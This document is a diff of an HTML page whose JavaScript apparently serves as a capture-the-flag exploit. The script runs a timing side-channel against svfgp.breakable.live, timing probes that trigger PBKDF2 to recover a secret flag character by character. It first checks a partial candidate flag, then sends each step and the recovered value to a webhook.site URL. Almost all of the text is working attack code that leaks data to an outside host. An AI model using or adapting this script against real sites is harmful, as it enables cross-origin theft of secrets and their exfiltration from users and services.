@@ -1,15 +1,14 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
-// v9 - verified sequential oracle, fresh start
+// v10 - verification sweep then sequential oracle
 var T="https://svfgp.breakable.live";
 var W="https://webhook.site/bfddf06d-fc1d-4615-b9e2-1842fa04aede";
-var known="CTF{";
+var CANDIDATE="CTF{1651084a03cc4000000200000000415";
 var HEX="0123456789abcdef";
 
 function exfil(d){
   fetch(W+"?d="+encodeURIComponent(d)+"&t="+Date.now(),{mode:"no-cors",cache:"no-store"}).catch(function(){});
 }
-
-exfil("v9_LOADED");
+exfil("v10_LOADED");
 
 function probeOne(q){
   return new Promise(function(res){
@@ -36,107 +35,80 @@ function probeOne(q){
 
 function shuffle(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}
 
-// Measure baseline: probe a non-matching prefix to get typical fast time
-async function getBaseline(){
-  var times=[];
-  for(var i=0;i<3;i++){
-    var t=await probeOne("ZZZZZZ"+Math.random());
-    if(t>0)times.push(t);
-  }
-  if(times.length===0)return 180;
-  times.sort(function(a,b){return a-b;});
-  return times[Math.floor(times.length/2)]; // median
-}
-
-// Verify prefix is correct (should trigger PBKDF2, return > baseline+150)
-async function verifyPrefix(prefix,baseline){
-  var t=await probeOne(prefix);
-  return {ok:t > baseline+150, t:t};
-}
-
-async function findChar(prefix,pos,baseline){
-  // Warmup
-  await probeOne("ZZZZ");
-  
-  // Test all 16 hex chars in random order, collect times
-  var chars=shuffle(HEX.split(""));
-  var results=[];
-  for(var i=0;i<chars.length;i++){
-    var ch=chars[i];
-    var t=await probeOne(prefix+ch);
-    results.push({c:ch,t:t});
-    // Early exit: if clearly above baseline+200ms, likely our match
-    if(t > baseline+200){
-      // Verify by probing again
-      var t2=await probeOne(prefix+ch);
-      if(t2 > baseline+150){
-        exfil("HIT_P"+pos+":"+ch+"="+t+"ms,v="+t2+"ms(bl="+baseline+")");
-        return ch;
-      }
-    }
-  }
-  
-  // No early exit — pick top and verify
-  results.sort(function(a,b){return b.t-a.t;});
-  var top=results[0], second=results[1];
-  var gap=top.t-second.t;
-  var info=results.slice(0,4).map(function(x){return x.c+"="+x.t;}).join(",");
-  exfil("P"+pos+":"+info+"|gap="+gap+"|bl="+baseline);
-  
-  if(gap>80){
-    // Verify the top char
-    var vt=await probeOne(prefix+top.c);
-    if(vt > baseline+150){
-      exfil("VER_P"+pos+":"+top.c+"="+vt+"ms_OK");
-      return top.c;
-    }
-  }
-  
-  // No clear winner - report and stop (don't guess)
-  exfil("STUCK_P"+pos+":no_clear_winner");
-  return null;
-}
-
 async function run(){
-  exfil("v9_START:"+known);
+  exfil("v10_START");
   var t0=Date.now();
-  
-  // Get baseline
-  var baseline=await getBaseline();
-  exfil("BASELINE:"+baseline+"ms");
-  
-  // Verify our starting prefix is valid
-  var v=await verifyPrefix(known,baseline);
-  exfil("VERIFY_PREFIX:"+v.t+"ms(ok="+v.ok+")");
-  if(!v.ok){
-    exfil("BAD_PREFIX:"+known);
-    return;
+
+  // Phase 1: warmup
+  await probeOne("ZZZZ");
+  var bl=await probeOne("ZZZZ"); // baseline
+  exfil("BL:"+bl);
+
+  // Phase 2: verify each prefix length from 1 to full candidate
+  // "CTF{1651084a03cc4000000200000000415"
+  // Test: CTF{1, CTF{16, CTF{165, ... to find where PBKDF2 stops
+  var lastGood=4; // we know CTF{ is correct
+  for(var len=5; len<=CANDIDATE.length; len++){
+    if(Date.now()-t0>48000) break;
+    var prefix=CANDIDATE.substring(0,len);
+    var t=await probeOne(prefix);
+    var ok=t>280; // PBKDF2 ~460ms, baseline ~170ms, threshold ~280ms
+    exfil("V"+len+":"+CANDIDATE[len-1]+"="+t+"ms("+(ok?"OK":"BAD")+")");
+    if(ok){
+      lastGood=len;
+    } else {
+      // This char is wrong - stop verification
+      exfil("BREAK_AT:"+len+"_char="+CANDIDATE[len-1]+"_lastGood="+lastGood);
+      break;
+    }
   }
 
+  var known=CANDIDATE.substring(0,lastGood);
+  exfil("VERIFIED:"+known+"(len="+lastGood+")");
+
+  // Phase 3: continue finding chars from lastGood
   while(known.length < 4+64){
     if(Date.now()-t0>53000){exfil("TIME:"+known);break;}
     var pos=known.length-4;
-    var ch=await findChar(known,pos,baseline);
-    if(!ch){
-      exfil("ABORT:"+known);
-      break;
+
+    // Warmup
+    await probeOne("ZZZZ");
+
+    // Test all 16 hex chars in random order
+    var chars=shuffle(HEX.split(""));
+    var results=[];
+    var earlyHit=null;
+    for(var i=0;i<chars.length;i++){
+      var ch=chars[i];
+      var t=await probeOne(known+ch);
+      results.push({c:ch,t:t});
+      if(t>280){
+        // Verify
+        var t2=await probeOne(known+ch);
+        if(t2>250){
+          earlyHit=ch;
+          exfil("HIT_P"+pos+":"+ch+"="+t+",v="+t2);
+          break;
+        }
+      }
     }
-    known+=ch;
-    exfil("F:"+known);
-    
-    // Verify new prefix is still valid (PBKDF2 should still trigger)
-    var vr=await verifyPrefix(known,baseline);
-    if(!vr.ok){
-      // Last char was wrong! Remove it and try again
-      exfil("WRONG_CHAR:"+known+"(vt="+vr.t+"ms),backtrack");
-      known=known.slice(0,-1);
-      // Try the position again with more careful measurement
-      var ch2=await findChar(known,pos,baseline);
-      if(ch2 && ch2!==ch){
-        known+=ch2;
-        exfil("FIX:"+known);
+
+    if(earlyHit){
+      known+=earlyHit;
+      exfil("F:"+known);
+    } else {
+      // Pick max
+      results.sort(function(a,b){return b.t-a.t;});
+      var top=results[0];
+      var info=results.slice(0,3).map(function(x){return x.c+"="+x.t;}).join(",");
+      exfil("NOWIN_P"+pos+":"+info);
+      // Verify top pick
+      var vt=await probeOne(known+top.c);
+      if(vt>250){
+        known+=top.c;
+        exfil("F:"+known);
       } else {
-        exfil("CANT_FIX:"+known);
+        exfil("STUCK:"+known);
         break;
       }
     }
@@ -145,6 +117,5 @@ async function run(){
   if(known.length===4+64)known+="}";
   exfil("DONE:"+known);
 }
-
 setTimeout(run,200);
 </script></body></html>
